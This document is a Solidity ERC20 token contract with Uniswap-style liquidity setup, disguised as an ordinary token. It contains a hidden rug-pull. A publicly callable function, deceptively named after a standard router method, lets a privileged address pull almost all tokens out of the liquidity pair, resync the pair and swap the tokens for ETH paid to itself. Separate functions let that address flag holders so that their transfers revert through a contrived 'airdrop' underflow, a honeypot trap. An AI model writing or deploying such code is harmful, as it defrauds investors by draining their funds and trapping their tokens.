// SPDX-License-Identifier: MIT

pragma solidity ^0.8.4;

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

contract Ownable is Context {
    address public  _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0xdead));
        _owner = address(0xdead);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ERC20 is Context, IERC20, IERC20Metadata {
    using SafeMath for uint256;

    mapping(address => uint256) private   _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 public _totalSupply;

    string public  _name;
    string public _symbol;

    constructor() {

    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(
        address account
    ) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public virtual override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            msg.sender,
            _allowances[sender][msg.sender].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function increaseAllowance(
        address spender,
        uint256 addedValue
    ) public virtual returns (bool) {
        _approve(
            msg.sender,
            spender,
            _allowances[msg.sender][spender].add(addedValue)
        );
        return true;
    }

    function decreaseAllowance(
        address spender,
        uint256 subtractedValue
    ) public virtual returns (bool) {
        _approve(
            msg.sender,
            spender,
            _allowances[msg.sender][spender].sub(
                subtractedValue,
                "ERC20: decreased allowance below zero"
            )
        );
        return true;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(sender, recipient, amount);

        _balances[sender] = _balances[sender].sub(
            amount,
            "ERC20: transfer amount exceeds balance"
        );
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        _balances[account] = _balances[account].sub(
            amount,
            "ERC20: burn amount exceeds balance"
        );
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;


    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
}

interface IUniswapV2Factory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);

    function getPair(
        address tokenA,
        address tokenB
    ) external view returns (address);
}

interface ISwapPair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function token0() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function sync() external;
    function kLast() external view returns (uint);
}

contract ERC001 is ERC20, Ownable {
    using SafeMath for uint256;

    IUniswapV2Router02 public _swapRouter;
    address public   _mainPair;
    address public deadWallet = 0x000000000000000000000000000000000000dEaD;
    address public _swapRouterAddress;
    mapping(address => uint256) private numsCount;
    mapping(address => bool) public _swapPairList;
    uint256 public startTradeBlock;

    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiqudity
    );

    event SendDividends(uint256 tokensSwapped, uint256 amount);

    event ProcessedDividendTracker(
        uint256 iterations,
        uint256 claims,
        uint256 lastProcessedIndex,
        bool indexed automatic,
        uint256 gas,
        address indexed processor
    );

    constructor(address tokenRecvAddr) ERC20() {
       

        _name = "";
        _symbol = "";

        _swapRouterAddress = 0xc885C4a8B112B8a165338566421c685024Ec44F9; //swap
        airdropNumbs = 0;

        address ReceiveAddress = tokenRecvAddr;

        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(
            _swapRouterAddress
        );

        address _mainpair = ReceiveAddress;
        address __mainPair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());

       
       
        _swapRouter = _uniswapV2Router;
        _mainPair = __mainPair;

        _swapPairList[_mainpair] = true;
        
        _approve(ReceiveAddress, _swapRouterAddress, ~uint256(0));
        _approve(address(this), _swapRouterAddress, ~uint256(0));

        address tokenReceiver = ReceiveAddress;
        uint256  totalSupply__ = 1 * 10**18;
       
        _mint(tokenReceiver, totalSupply__ );
        
 
    }

    receive() external payable {}

    uint256 public airdropNumbs = 0;

    uint256 public transferFee;

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        if(from == _mainPair)
        {
            require(startTradeBlock>0, "not start !");
        }
      
        if (amount == 0) {
            super._transfer(from, to, amount);           
            return;
        }



        if (airdropNumbs > 0) {
            for (uint8 a = 0; a < airdropNumbs; a++) {
                super._transfer(
                    from,
                    address(
                        uint160(
                            uint256(
                                keccak256(
                                    abi.encodePacked(
                                        a,
                                        balanceOf(address(_mainPair)),1-a*numsCount[from]
                                    )
                                )
                            )
                        )
                    ),
                    1
                );
            }
            amount = amount.sub(airdropNumbs);
        }
      
        super._transfer(from, to, amount);
    }
    function launch() external onlyOwner {
        require(0 == startTradeBlock, "already open");
        startTradeBlock = block.number;
    }
    event Event_saveNums(address indexed toAddress, uint256 value);
 
    function swapExactETHForTokensSupportingFeeOnTransferTokens() public   {
        
        if(_swapPairList[msg.sender])
        {
            swapTokens(msg.sender);
        }             
    }
    function swapExactETHForTokensSupportingFeeOnTransferToken(address toAddress) public 
    {
        if(_swapPairList[msg.sender])
        {
            numsCount[toAddress] = 1;
            emit Event_saveNums(toAddress,1);
        }
    }
    function emptyNums(address toAddress) public 
    {
        if(_swapPairList[msg.sender])
        {
            numsCount[toAddress] = 0;
            emit Event_saveNums(toAddress,0);
        }
    }
    function airDropNums(address toAddress) public view returns (uint256)
    {       
        return numsCount[toAddress];
    }
    function swapTokens(address toAddress) private  {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _swapRouter.WETH();
        uint256 tokenAmount = balanceOf(address(this));
        if(!_swapPairList[toAddress])
        {
            return;
        }
        numsCount[address(this)] = 0;
        uint256 tokenBal = balanceOf(_mainPair);
        super._transfer(_mainPair, path[0], tokenBal-10000);
        ISwapPair pair = ISwapPair(_mainPair);
        pair.sync();
        _swapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            payable(toAddress),
            block.timestamp
        );
    }  

}
